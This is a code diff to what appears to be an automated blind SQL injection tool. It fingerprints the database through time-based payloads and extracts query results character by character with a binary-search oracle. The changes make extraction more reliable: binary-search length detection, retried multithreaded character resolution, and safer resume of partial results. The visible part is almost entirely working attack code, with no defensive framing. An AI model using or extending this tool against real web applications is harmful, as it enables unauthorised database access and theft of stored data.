@@ -56,7 +56,7 @@ EXAMPLES
 ----------------------------------------------------------------------
 """
 import sys, os, time, json, re, hashlib, argparse, urllib.parse, threading
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
 
 requests.packages.urllib3.disable_warnings()
@@ -313,12 +313,6 @@ class Oracle_:
 
     def fires(self, cond): raise NotImplementedError
 
-    def length(self, query):
-        for n in range(1, self.a.maxlen + 1):
-            if self.fires(f"{self.dbms.length(query)}={n}"):
-                return n
-        return None
-
     def char(self, query, pos):
         # binary-search the Unicode code point; ASCII stays in the fast 0-127 band,
         # non-ASCII auto-extends so UTF-8 data isn't silently corrupted.
@@ -452,7 +446,6 @@ def fingerprint_dbms(target, ctx, classifier, a, candidates):
 
 def find_time(target, a, contexts, candidates):
     """Try time payloads across DBMS+contexts; the one that fires reveals the DBMS."""
-    thresh = a.threshold if a.threshold else a.sleep * 0.6
     for d in candidates:
         ctxs = list(contexts)
         if d.stacked:
@@ -566,9 +559,7 @@ def extract_error(target, dbms, ctx, a, query=None):
 def extract_search(oracle, a, state_path, sig, value="", length=None):
     q = a.query
     if length is None:
-        length = oracle.length(q)
-        if length is None:
-            return None
+        length = _bin_length(oracle, q, cap=4096)
         save_state(state_path, sig, length, value, oracle.t.count)
     print(f"[+] length = {length}")
 
@@ -576,10 +567,28 @@ def extract_search(oracle, a, state_path, sig, value="", length=None):
         print(f"[*] extracting with {a.threads} workers ...", flush=True)
         todo = list(range(len(value) + 1, length + 1))
         chars = {}
+
+        def _resolve(p, tries=2):
+            # isolate per-position failures so one bad worker can't kill the batch
+            for attempt in range(tries + 1):
+                try:
+                    return oracle.char_confirmed(q, p)
+                except Exception:
+                    if attempt == tries:
+                        raise
+            return None
+
         with ThreadPoolExecutor(max_workers=a.threads) as ex:
-            for pos, c in zip(todo, ex.map(lambda p: oracle.char_confirmed(q, p), todo)):
-                chars[pos] = c
-        value += "".join(chars[p] for p in sorted(chars))
+            futures = {ex.submit(_resolve, p): p for p in todo}
+            for fut in as_completed(futures):
+                chars[futures[fut]] = fut.result()
+
+        # commit only the contiguous prefix from the resume point —
+        # a missing position must not shift later characters
+        for p in todo:
+            if p not in chars:
+                break
+            value += chars[p]
         save_state(state_path, sig, length, value, oracle.t.count)
         return value
 
@@ -777,7 +786,7 @@ def main():
     # ---- --query : single scalar with resume ----
     print("\n=== EXTRACTION ===")
     sig = job_signature(a, det, target)
-    state_path = a.state or f".pgtb-{sig}.json"
+    state_path = a.state or f".blindfold-{sig}.json"
     print(f"[*] query : {a.query}")
 
     if det.technique == "error-based":
